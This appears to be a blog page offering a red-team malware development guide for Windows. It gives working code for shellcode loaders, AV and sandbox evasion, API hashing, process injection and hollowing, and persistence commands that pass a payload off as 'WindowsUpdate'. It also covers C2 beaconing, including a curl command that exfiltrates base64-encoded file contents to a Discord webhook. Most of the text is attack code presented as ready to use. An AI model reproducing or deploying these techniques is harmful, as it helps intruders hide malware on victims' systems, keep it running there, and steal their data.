                <div class="blog-content">
                    <p id="mal-intro">
                        AV vendors hate this one simple trick: not being a moron about your payload delivery. Malware development isn't about writing complex code — it's about writing simple code that doesn't trigger signatures. EDR is just a fancy syslog collector if you know which APIs to unhook. And antivirus engines are pattern-matching toddlers that lose their minds if you XOR your strings with a single byte. This isn't a masterclass in advanced persistent threats. This is a survival guide for red teamers who need their payload to run once, run silently, and then delete itself before the SOC analyst finishes their coffee.
                    </p>

                    <h2 id="mal-shellcode">Shellcode Execution</h2>
                    <p>
                        Shellcode is position-independent code that does something useful — spawn a shell, connect back, inject into another process. The challenge isn't writing it; the challenge is getting the OS to execute it without every security product screaming bloody murder.
                    </p>
                    <pre><code>// === CLASSIC VIRTUALALLOC + CREATE THREAD ===
// This pattern is ancient and heavily signatured
// But it's still the foundation everything else builds on

#include <windows.h>

unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8..."; // msfvenom payload

int main() {
    // Allocate executable memory
    LPVOID addr = VirtualAlloc(NULL, sizeof(shellcode), 
                               MEM_COMMIT | MEM_RESERVE, 
                               PAGE_EXECUTE_READWRITE);

    // Copy shellcode
    RtlMoveMemory(addr, shellcode, sizeof(shellcode));

    // Execute
    HANDLE hThread = CreateThread(NULL, 0, 
                                  (LPTHREAD_START_ROUTINE)addr, 
                                  NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}

// === WHY THIS GETS FLAGGED ===
// 1. PAGE_EXECUTE_READWRITE is suspicious (RWX)
// 2. CreateThread with executable memory
// 3. Static shellcode bytes match signatures
// 4. Import table has VirtualAlloc, CreateThread

// === BETTER: RW THEN RX ===
LPVOID addr = VirtualAlloc(NULL, sizeof(shellcode), 
                           MEM_COMMIT | MEM_RESERVE, 
                           PAGE_READWRITE);
RtlMoveMemory(addr, shellcode, sizeof(shellcode));
// Change to execute only after copy
DWORD oldProtect;
VirtualProtect(addr, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect);

// === EVEN BETTER: HEAP INSTEAD OF VIRTUALALLOC ===
// Heap allocations are less scrutinized
HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
LPVOID addr = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(shellcode));
RtlMoveMemory(addr, shellcode, sizeof(shellcode));
// Execute via function pointer
((void(*)())addr)();

// === BEST: EXISTING MEMORY REGIONS ===
// Find a legitimate loaded DLL, overwrite its .text section
// No new allocations = nothing to flag
// Requires finding writable + executable memory in a trusted module</code></pre>

                    <h2 id="mal-av">AV Evasion</h2>
                    <p>
                        Antivirus is a pattern-matching engine with a marketing budget. It looks for known bytes, known behaviors, and known API sequences. If you change the bytes, reorder the APIs, and delay your malicious behavior, you become invisible. Not because you're clever — because AV is fundamentally stupid.
                    </p>

                    <h3 id="mal-enc">Encryption & Encoding</h3>
                    <pre><code>// === XOR ENCRYPTION ===
// Single-byte XOR is trivial to break, but it defeats static signatures
void xor_encrypt(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// Encrypt shellcode at compile time
// Decrypt at runtime before execution
// Key can be derived from environment, hostname, or hardcoded

// === AES ENCRYPTION ===
// Use Windows Cryptography APIs or custom implementation
// AES-256 in CBC mode with random IV
// Key embedded as obfuscated constants

// === BASE64 / CUSTOM ENCODING ===
// Base64 is obvious, but custom encoding fools fewer scanners
// Example: add 1 to every byte, rotate, interleave with junk
void custom_decode(unsigned char *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        data[i] = (data[i] - 1) ^ 0x55;
    }
}

// === STRING ENCODING ===
// Never use plaintext strings
// Encode API names, URLs, filenames
// Decode at runtime

// Example: stack strings
char str[] = {'N', 't', 'D', 'l', 'l', '.', 'd', 'l', 'l', 0};
// Or encoded:
char str[] = {0x4f, 0x57, 0x45, 0x4b, 0x4b, 0x2f, 0x4b, 0x4b, 0x4b, 0};
// Decode: each byte XOR 0x33

// === SLEEP / DELAY ===
// Many sandboxes only run for 30-60 seconds
// Sleep for 2 minutes before executing payload
Sleep(120000);
// Or use busy loops to avoid Sleep API detection
for (volatile int i = 0; i < 1000000000; i++);

// === DOMAIN GENERATION ALGORITHM (DGA) ===
// Generate C2 domains algorithmically
// Hard to block, hard to predict
// Based on date, seed, or environment
char* generate_domain(int seed) {
    static char domain[32];
    const char *tlds[] = {"com", "net", "org"};
    sprintf(domain, "%x%x%x.%s", seed*7, seed*13, seed*17, tlds[seed % 3]);
    return domain;
}</code></pre>

                    <h3 id="mal-api">API Hashing</h3>
                    <pre><code>// === DYNAMIC API RESOLUTION ===
// Don't import suspicious APIs in the IAT
// Resolve them at runtime by walking PEB

// Get kernel32.dll base from PEB
PPEB peb = (PPEB)__readgsqword(0x60);
PLDR_DATA_TABLE_ENTRY ldr = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InMemoryOrderModuleList.Flink;

// Walk loaded modules
while (ldr) {
    if (ldr->FullDllName.Buffer) {
        // Compare hashed DLL name
        if (hash_wstring(ldr->FullDllName.Buffer) == KERNEL32_HASH) {
            // Found kernel32.dll, now resolve APIs by hash
            base = ldr->DllBase;
            break;
        }
    }
    ldr = (PLDR_DATA_TABLE_ENTRY)ldr->InMemoryOrderLinks.Flink;
}

// Hash function (common: DJB2, SDBM, custom)
unsigned long hash_string(const char *str) {
    unsigned long hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c; // hash * 33 + c
    return hash;
}

// Resolve API by hash
FARPROC resolve_api(HMODULE base, unsigned long api_hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)base + 
        nt->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD *names = (DWORD*)((BYTE*)base + exp->AddressOfNames);
    DWORD *funcs = (DWORD*)((BYTE*)base + exp->AddressOfFunctions);
    WORD *ords = (WORD*)((BYTE*)base + exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char*)((BYTE*)base + names[i]);
        if (hash_string(name) == api_hash) {
            return (FARPROC)((BYTE*)base + funcs[ords[i]]);
        }
    }
    return NULL;
}

// Usage:
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
pVirtualAlloc myVirtualAlloc = (pVirtualAlloc)resolve_api(base, 0x12345678); // hash of "VirtualAlloc"
LPVOID mem = myVirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</code></pre>

                    <h2 id="mal-inject">Process Injection</h2>
                    <p>
                        Why run your malware in your own process when you can hide it in notepad.exe? Process injection is about finding a legitimate process and turning it into your unwitting accomplice. The goal is to execute shellcode in the context of a trusted process so EDR trusts it too.
                    </p>
                    <pre><code>// === CLASSIC PROCESS INJECTION ===
// Open target process, allocate memory, write shellcode, create remote thread

HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
LPVOID addr = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), 
                             MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, addr, shellcode, sizeof(shellcode), NULL);
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                    (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);

// === PROCESS HOLLOWING ===
// Create a suspended legitimate process (e.g., notepad.exe)
// Unmap its memory, replace with your payload, resume

STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, 
              CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// Get thread context
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(pi.hThread, &ctx);

// Read PEB to get image base
// Unmap original section
// Allocate new memory at same base
// Write payload headers and sections
// Update thread context entry point
// Resume thread

// === APC INJECTION ===
// Queue an Asynchronous Procedure Call to a thread
// Thread must be in alertable state

// Find alertable thread (often main thread after SleepEx)
HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, target_tid);
QueueUserAPC((PAPCFUNC)addr, hThread, NULL);

// === THREAD HIJACKING ===
// Suspend thread, modify instruction pointer, resume
SuspendThread(hThread);
GetThreadContext(hThread, &ctx);
ctx.Rip = (DWORD64)addr; // x64
SetThreadContext(hThread, &ctx);
ResumeThread(hThread);

// === REFLECTIVE DLL INJECTION ===
// Load a DLL from memory, not from disk
// No file on disk = no file-based detection
// Manual map the DLL into target process
// Resolve imports, fix relocations, call DllMain

// === EARLYBIRD APC INJECTION ===
// Create process suspended, inject via APC before main thread starts
// Bypasses many hook-based detections
CreateProcess(target_path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, ...);
QueueUserAPC((PAPCFUNC)payload, pi.hThread, 0);
ResumeThread(pi.hThread);</code></pre>

                    <h2 id="mal-persistence">Persistence</h2>
                    <p>
                        Getting in is easy. Staying in is the challenge. Persistence mechanisms ensure your payload survives reboots, updates, and the inevitable moment when someone runs Malwarebytes. The best persistence is invisible, redundant, and boring — something an admin would scroll past in Autoruns without a second thought.
                    </p>
                    <pre><code># === REGISTRY RUN KEYS ===
# Most common, most monitored, still works
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" \
  /v "WindowsUpdate" /t REG_SZ /d "C:\\Users\\Public\\update.exe" /f

# Also:
# HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
# HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
# HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce

# === SCHEDULED TASKS ===
schtasks /create /tn "WindowsUpdate" /tr "C:\\Users\\Public\\update.exe" \
  /sc onlogon /rl highest /f

# === WMI EVENT SUBSCRIPTION ===
# Invisible to most users, no registry keys, no scheduled tasks
# Trigger on event (logon, process start, time interval)

# Create filter (trigger on process start)
$FilterArgs = @{
    Name='WindowsUpdateFilter'
    EventNameSpace='root\\cimv2'
    QueryLanguage='WQL'
    Query="SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'"
}
$Filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments $FilterArgs

# Create consumer (execute payload)
$ConsumerArgs = @{
    Name='WindowsUpdateConsumer'
    CommandLineTemplate='C:\\Users\\Public\\update.exe'
}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\\subscription' -Arguments $ConsumerArgs

# Bind filter to consumer
$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments $BindingArgs

# === STARTUP FOLDER ===
# C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
# C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp

# === SERVICE CREATION ===
sc create "WindowsUpdate" binpath= "C:\\Users\\Public\\update.exe" start= auto
sc start "WindowsUpdate"

# === DLL HIJACKING ===
# Place malicious DLL in directory where app loads DLLs from
# App loads your DLL instead of the legitimate one
# Common targets: browsers, productivity apps, games

# === OFFICE ADD-INS ===
# Word/Excel add-ins load on startup
# %APPDATA%\\Microsoft\\Word\\STARTUP
# %APPDATA%\\Microsoft\\Excel\\XLSTART</code></pre>

                    <h2 id="mal-c2">C2 Communication</h2>
                    <p>
                        Command and control is how you talk to your payload after it's running. The goal is to blend in with legitimate traffic, use protocols that firewalls allow, and avoid patterns that DLP and NIDS look for. HTTPS is the baseline. DNS is the fallback. And custom protocols over allowed ports are the advanced play.
                    </p>
                    <pre><code># === HTTPS C2 ===
# Use legitimate-looking domains
# CloudFront, Azure CDN, GitHub Pages for fronting
# Valid SSL certificates (Let's Encrypt)

# Example: beacon every 30 seconds with jitter
while (true) {
    Sleep(30000 + rand() % 15000); // 30-45s jitter

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", ...);
    HINTERNET hConnect = WinHttpConnect(hSession, L"cdn.legit-looking-domain.com", 443, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v2/sync", ...);

    // Send encrypted beacon data
    WinHttpSendRequest(hRequest, ...);
    // Read response for commands
    WinHttpReadData(hRequest, ...);
}

# === DNS C2 ===
# Slow but stealthy
# Encode data in subdomain labels
# Example: base32-encoded data in DNS query
# a1b2c3d4e5f6.target-c2.com → CNAME response contains command

# Tools: dnscat2, iodine, DNSChef

# === DOH (DNS over HTTPS) ===
# Bypasses DNS filtering by using HTTPS
# Looks like regular HTTPS traffic
# Queries to 8.8.8.8 or Cloudflare DOH endpoints

# === SLACK / DISCORD C2 ===
# Use webhooks or bot APIs
# Traffic goes to legitimate domains
# Messages contain encoded commands and responses

# Discord webhook example:
curl -H "Content-Type: application/json" \
  -d '{"content":"'$(base64 -w0 output.txt)'"}' \
  https://discord.com/api/webhooks/WEBHOOK_ID/TOKEN

# === GITHUB C2 ===
# Create issue comments with encoded commands
# Read responses from gist revisions
# All traffic to github.com — whitelisted everywhere

# === DOMAIN FRONTING ===
# Use CDN with custom Host header
# TLS SNI says one domain, HTTP Host header says another
# AWS CloudFront, Azure CDN, Google App Engine
# (Many CDNs have fixed this, but some still work)</code></pre>

